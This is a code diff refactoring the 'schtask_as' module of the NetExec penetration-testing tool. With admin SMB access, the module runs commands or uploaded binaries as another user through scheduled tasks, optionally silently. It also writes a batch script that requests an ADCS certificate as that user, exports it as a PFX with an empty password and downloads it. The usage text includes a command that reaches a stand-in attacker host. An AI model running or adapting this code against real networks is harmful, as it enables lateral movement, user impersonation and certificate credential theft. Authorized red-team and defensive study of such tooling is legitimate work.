@@ -1,9 +1,10 @@
-import os
 from time import sleep
 from io import BytesIO
 from textwrap import dedent
-from nxc.paths import TMP_PATH
+from os import path, makedirs
 from traceback import format_exc
+
+from nxc.paths import NXC_PATH
 from nxc.helpers.misc import CATEGORY
 from nxc.helpers.misc import gen_random_string
 from nxc.protocols.smb.atexec import TSCH_EXEC
@@ -42,51 +43,34 @@ class NXCModule:
         nxc smb <ip> -u <user> -p <password> -M schtask_as -o USER=Administrator CMD='dir \\<attacker-ip>\pwn' TASK='Legit Task' SILENTCOMMAND='True'
         nxc smb <ip> -u <user> -p <password> -M schtask_as -o USER=Administrator CMD=certreq CA='ADCS\whiteflag-ADCS-CA' TEMPLATE=User
         """
+        self.logger = context.log
         self.command_to_run = self.binary_to_upload = self.run_task_as = self.task_name = self.output_filename = self.output_file_location = self.time = self.ca_name = self.template_name = None
         self.share = "C$"
-        self.tmp_dir = "C:\\Windows\\Temp\\"
-        self.tmp_path = self.tmp_dir.split(":")[1]
-        self.show_output = True
+        self.output_file_location = "\\Windows\\Temp"
 
-        if "CMD" in module_options:
-            self.command_to_run = module_options["CMD"]
+        # Basic schtask_as parameters
+        self.command_to_run = module_options.get("CMD")
+        self.binary_to_upload = module_options.get("BINARY")
+        self.run_task_as = module_options.get("USER")
 
-        if "BINARY" in module_options:
-            self.binary_to_upload = module_options["BINARY"]
+        # Task customization options
+        self.task_name = module_options.get("TASK")
+        self.output_filename = module_options.get("FILE", gen_random_string(8))
+        self.output_file_location = module_options.get("LOCATION", self.output_file_location).rstrip("\\")
+        self.show_output = module_options.get("SILENTCOMMAND", "").lower() not in {"true", "yes", "1"}
 
-        if "USER" in module_options:
-            self.run_task_as = module_options["USER"]
-
-        if "TASK" in module_options:
-            self.task_name = module_options["TASK"]
-
-        if "FILE" in module_options:
-            self.output_filename = module_options["FILE"]
-
-        if "LOCATION" in module_options:
-            # Ensure trailing backslashes
-            self.output_file_location = module_options["LOCATION"].rstrip("\\") + "\\"
-
-        if "SILENTCOMMAND" in module_options and module_options["SILENTCOMMAND"] in ["True", "yes", "1"]:
-            self.show_output = False
-
-        if "CA" in module_options:
-            self.ca_name = module_options["CA"]
-            # Ensure the CA name is correctly formated
-            if "\\" not in self.ca_name:
-                context.log.fail("CA name must be in the following format: SERVER_NAME\\CertificateAuthority_Name")
-                exit(1)
-            elif "\\\\" in self.ca_name:
-                self.ca_name = self.ca_name.replace("\\\\", "\\")
-
-        if "TEMPLATE" in module_options:
-            self.template_name = module_options["TEMPLATE"]
+        # ADCS certificate request options
+        self.ca_name = module_options.get("CA")
+        self.template_name = module_options.get("TEMPLATE")
 
     def on_admin_login(self, context, connection):
-        self.logger = context.log
 
         if self.command_to_run is None:
             self.logger.fail("You need to specify a CMD to run")
+            return
+
+        if self.run_task_as is None:
+            self.logger.fail("You need to specify a USER to run the task as")
             return
 
         if self.command_to_run.lower() == "certreq":
@@ -99,18 +83,17 @@ class NXCModule:
                 return
 
             tmp_share = self.share.replace("$", ":")
-            random_file_prefix = gen_random_string(10)
-
+            full_path_prefixed_file = f"{tmp_share}\\{self.output_file_location}\\{self.output_filename}"
             batch_file = BytesIO(dedent(f"""
             @echo off
             setlocal enabledelayedexpansion
 
-            certreq -new {tmp_share}\\{self.tmp_path}\\{random_file_prefix}.inf {tmp_share}\\{self.tmp_path}\\{random_file_prefix}.req > nul
-            certreq -submit -config {self.ca_name} {tmp_share}\\{self.tmp_path}\\{random_file_prefix}.req {tmp_share}\\{self.tmp_path}\\{random_file_prefix}.cer > nul
+            certreq -new {full_path_prefixed_file}.inf {full_path_prefixed_file}.req > nul
+            certreq -submit -config {self.ca_name} {full_path_prefixed_file}.req {full_path_prefixed_file}.cer > nul
 
             set "HASH="
 
-            for /f "usebackq tokens=* delims=" %%L in (`certreq -accept {tmp_share}\\{self.tmp_path}\\{random_file_prefix}.cer`) do (
+            for /f "usebackq tokens=* delims=" %%L in (`certreq -accept {full_path_prefixed_file}.cer`) do (
                 set "line=%%L"
 
                 for /f "tokens=2* delims=:" %%X in ("!line!") do (
@@ -120,13 +103,14 @@ class NXCModule:
                     if not errorlevel 1 (
                         if "!candidate:~40!"=="" (
                             set "HASH=!candidate!"
-                            certutil -user -exportPFX -p "" !HASH! {tmp_share}\\{self.tmp_path}\\{random_file_prefix}.pfx > nul
+                            certutil -user -exportPFX -p "" !HASH! {full_path_prefixed_file}.pfx > nul
                         )
                     )
                 )
             )
+            exit
             """).encode())
-            connection.conn.putFile(self.share, f"{self.tmp_path}\\{random_file_prefix}.bat", batch_file.read)
+            connection.conn.putFile(self.share, f"{self.output_file_location}\\{self.output_filename}.bat", batch_file.read)
             self.logger.success("Upload batch file successfully")
 
             inf_file = BytesIO(dedent(f"""
@@ -154,32 +138,25 @@ class NXCModule:
             [RequestAttributes]
             CertificateTemplate = {self.template_name}
             """).encode())
-            connection.conn.putFile(self.share, f"{self.tmp_path}\\{random_file_prefix}.inf", inf_file.read)
+            connection.conn.putFile(self.share, f"{self.output_file_location}\\{self.output_filename}.inf", inf_file.read)
             self.logger.success("Upload INF file successfully")
 
-            self.command_to_run = f"{tmp_share}\\{self.tmp_path}\\{random_file_prefix}.bat"
-
-        if self.run_task_as is None:
-            self.logger.fail("You need to specify a USER to run the command as")
-            return
-
-        if self.show_output is False:
-            self.logger.display("Command will be executed silently without output")
+            self.command_to_run = f"{full_path_prefixed_file}.bat"
 
         if self.binary_to_upload:
-            if not os.path.isfile(self.binary_to_upload):
+            if not path.isfile(self.binary_to_upload):
                 self.logger.fail(f"Cannot find {self.binary_to_upload}")
                 return
             else:
                 self.logger.display(f"Uploading {self.binary_to_upload}")
-                binary_file_location = self.tmp_path if self.output_file_location is None else self.output_file_location
                 with open(self.binary_to_upload, "rb") as binary_to_upload:
                     try:
-                        self.binary_to_upload_name = os.path.basename(self.binary_to_upload)
-                        connection.conn.putFile(self.share, f"{binary_file_location}{self.binary_to_upload_name}", binary_to_upload.read)
-                        self.logger.success(f"Binary {self.binary_to_upload_name} successfully uploaded in {binary_file_location}{self.binary_to_upload_name}")
+                        self.binary_to_upload_name = path.basename(self.binary_to_upload)
+                        connection.conn.putFile(self.share, f"{self.output_file_location}\\{self.binary_to_upload_name}", binary_to_upload.read)
+                        self.command_to_run = f"{self.output_file_location}\\{self.command_to_run}"
+                        self.logger.success(f"Binary {self.binary_to_upload_name} successfully uploaded in {self.output_file_location}\\{self.binary_to_upload_name}")
                     except Exception as e:
-                        self.logger.fail(f"Error writing file to share {binary_file_location}: {e}")
+                        self.logger.fail(f"Error writing file to share {self.output_file_location}: {e}")
                         return
 
         self.logger.display("Connecting to the remote Service control endpoint")
@@ -205,7 +182,11 @@ class NXCModule:
                 self.output_file_location,
             )
 
-            self.logger.display(f"Executing '{self.command_to_run}' as '{self.run_task_as}'")
+            if self.show_output is False:
+                self.logger.display(f"Silently executing '{self.command_to_run}' as '{self.run_task_as}'")
+            else:
+                self.logger.display(f"Executing '{self.command_to_run}' as '{self.run_task_as}'")
+
             output = exec_method.execute(self.command_to_run, self.show_output)
 
             try:
@@ -219,29 +200,33 @@ class NXCModule:
                     self.logger.highlight(line.rstrip())
 
         except Exception:
-            self.logger.debug("Error executing command via atexec, traceback:")
-            self.logger.debug(format_exc())
+            self.logger.debug(f"Error executing command via atexec, traceback: {format_exc()}")
         finally:
             if self.binary_to_upload:
                 try:
-                    connection.conn.deleteFile(self.share, f"{binary_file_location}{self.binary_to_upload_name}")
-                    context.log.success(f"Binary {binary_file_location}{self.binary_to_upload_name} successfully deleted")
+                    connection.conn.deleteFile(self.share, f"{self.output_file_location}\\{self.binary_to_upload_name}")
+                    self.logger.success(f"Binary {self.output_file_location}{self.binary_to_upload_name} successfully deleted")
                 except Exception as e:
-                    context.log.fail(f"Error deleting {binary_file_location}{self.binary_to_upload_name} on {self.share}: {e}")
+                    self.logger.fail(f"Error deleting {self.output_file_location}{self.binary_to_upload_name} on {self.share}: {e}")
 
             if self.ca_name and self.template_name:
-                # Just waiting a bit for the pfx file to be correctly dumped
-                sleep(2)
-                with open(os.path.join(TMP_PATH, f"{self.run_task_as}.pfx"), "wb+") as dump_file:
-                    try:
-                        connection.conn.getFile(self.share, f"{self.tmp_path}\\{random_file_prefix}.pfx", dump_file.write)
-                        context.log.success(f"PFX file stored in {TMP_PATH}/{self.run_task_as}.pfx")
-                    except Exception as e:
-                        context.log.fail(f"Error while get {self.tmp_path}\\{random_file_prefix}.pfx: {e}")
 
-                for ext in [".bat", ".inf", ".cer", ".pfx", ".req", ".rsp"]:
+                dump_path = path.join(NXC_PATH, "schtask_as")
+                if not path.isdir(dump_path):
+                    makedirs(dump_path)
+
+                # This sleep is required as the computing of the pfx file takes some time
+                sleep(2)
+                with open(path.join(dump_path, f"{self.run_task_as}.pfx"), "wb+") as dump_file:
                     try:
-                        connection.conn.deleteFile(self.share, f"{self.tmp_path}\\{random_file_prefix}{ext}")
-                        context.log.debug(f"Successfully deleted {self.tmp_path}\\{random_file_prefix}{ext}")
+                        connection.conn.getFile(self.share, f"{self.output_file_location}\\{self.output_filename}.pfx", dump_file.write)
+                        self.logger.success(f"PFX file stored in {dump_path}/{self.run_task_as}.pfx")
                     except Exception as e:
-                        context.log.fail(f"Couldn't delete {self.tmp_path}\\{random_file_prefix}{ext} : {e}")
+                        self.logger.fail(f"Error while getting {self.output_file_location}\\{self.output_filename}.pfx: {e}")
+
+                for ext in [".bat", ".inf", ".cer", ".req", ".rsp", ".pfx", ""]:
+                    try:
+                        connection.conn.deleteFile(self.share, f"{self.output_file_location}\\{self.output_filename}{ext}")
+                        self.logger.debug(f"Successfully deleted {self.output_file_location}\\{self.output_filename}{ext}")
+                    except Exception as e:
+                        self.logger.debug(f"Couldn't delete {self.output_file_location}\\{self.output_filename}{ext} : {e}")
